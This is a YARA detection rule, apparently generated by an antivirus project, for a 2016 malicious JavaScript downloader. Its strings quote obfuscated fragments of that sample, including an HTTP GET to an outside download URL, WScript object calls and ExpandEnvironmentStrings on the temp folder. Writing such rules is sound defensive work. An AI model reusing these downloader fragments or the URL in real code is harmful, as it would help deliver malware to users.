rule sig_20160428_796b5675eb6c0dd940910645520f31f2 {
  meta:
    description = "datamaliciousorder - file 20160428_796b5675eb6c0dd940910645520f31f2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0198b384929e20391e37a32ed4827a270668fef4dd00b228ca380e1599feaa18"

  strings:
    $s1  = "AhuNhmZouVfjAldOpcQtk[QffEqlUkvJfuMhkIyxFzp](\"G\" + \"ET\", \"http://laichaupc.com/m8eusk\", false);" fullword ascii
    $s2  = "function HjdDovCftMutCxmAgeZce(WvpKknVfwKxwWcySelDsp){PblJgfRagZmbStyQkiBxv[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function HjdDovCftMutCxmAgeZce(WvpKknVfwKxwWcySelDsp){PblJgfRagZmbStyQkiBxv[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function XxiJqoNlvMrzQzvSocTma() {return PblJgfRagZmbStyQkiBxv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s5  = "function KmpHkzTjdIkcSvpYscRsu(VpeBkhUpbHhkPakGhzDgo, YxpEogAkfNjyNscBwdMjq){HcpXpfVawZgrAxqXnlQul = HcpXpfVawZgrAxqXnlQul * 1; " ascii
    $s6  = "return VpeBkhUpbHhkPakGhzDgo - YxpEogAkfNjyNscBwdMjq;};" fullword ascii
    $s7  = "var PblJgfRagZmbStyQkiBxv = function IirTljWzkSksNtsCwoFzh() {return XigFkmTwuIbmNoqCfcXai[KbkGxqFckBxfDdbNikOmu](\"WScript\"+\"" ascii
    $s8  = "var PblJgfRagZmbStyQkiBxv = function IirTljWzkSksNtsCwoFzh() {return XigFkmTwuIbmNoqCfcXai[KbkGxqFckBxfDdbNikOmu](\"WScript\"+\"" ascii
    $s9  = "var XigFkmTwuIbmNoqCfcXai = this[\"WScript\"];" fullword ascii
    $s10 = "function XxiJqoNlvMrzQzvSocTma() {return PblJgfRagZmbStyQkiBxv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function UwhKfcHnwVkrIswJgqMrz(){return SnwYngYxvMprLkjMtaHhb + \"\";};" fullword ascii
    $s12 = "if (AhuNhmZouVfjAldOpcQtk[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function KmpHkzTjdIkcSvpYscRsu(VpeBkhUpbHhkPakGhzDgo, YxpEogAkfNjyNscBwdMjq){HcpXpfVawZgrAxqXnlQul = HcpXpfVawZgrAxqXnlQul * 1; " ascii
    $s14 = "function MpwGjgItjYszQjiSirTuk() {return ((AvsWmsRaeLqsUotGixDpo == true) && (AvsWmsRaeLqsUotGixDpo == XwmFzzSqjDlkCjuOqiDhi)) ?" ascii
    $s15 = "function MpwGjgItjYszQjiSirTuk() {return ((AvsWmsRaeLqsUotGixDpo == true) && (AvsWmsRaeLqsUotGixDpo == XwmFzzSqjDlkCjuOqiDhi)) ?" ascii
    $s16 = "var RlqNqxExoXquFtyDmnZyg = new this[\"D\"+\"ate\"]();" fullword ascii
    $s17 = "function YnjXiuWihEfuHwdEkhGfu(){return KbkGxqFckBxfDdbNikOmu;};" fullword ascii
    $s18 = "}while (EbjNiuAlpUniRizLwiHdt);" fullword ascii
    $s19 = "function EmpIleUnwRqfKszXvlLkd()" fullword ascii
    $s20 = "XwmFzzSqjDlkCjuOqiDhi = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}